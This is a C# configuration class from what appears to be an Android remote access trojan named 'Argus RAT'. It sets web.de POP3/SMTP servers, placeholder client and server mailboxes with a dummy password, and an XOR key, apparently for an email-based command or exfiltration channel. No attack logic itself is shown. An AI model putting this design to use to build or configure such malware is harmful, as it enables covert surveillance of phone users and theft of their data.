using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

using System.Security.Cryptography;

namespace Argus___RAT
{
    class Globals
    {
        //-\\-//-\\-//-\\-//-\\-//- MAIL STUFF -\\-//-\\-//-\\-//-\\-//-\\

        // MAIL SERVER
        public String MailServerPopAddress  = "pop3.web.de";
        public String MailServerSmtpAddress = "smtp.web.de";
        public int MailServerSmtpPort       = 587;
        public int MailServerPort           = 995;

        // CLIENT
        public String ClientMailAddress     = "Client@web.de";
        public String ClientMailPass        = "p455w0rd";

        // SERVER
        public String ServerMailAddress     = "Server@web.de";

        // ENCRYPTION
        public String XorKey                = "testKeyOfDoom";
    }
}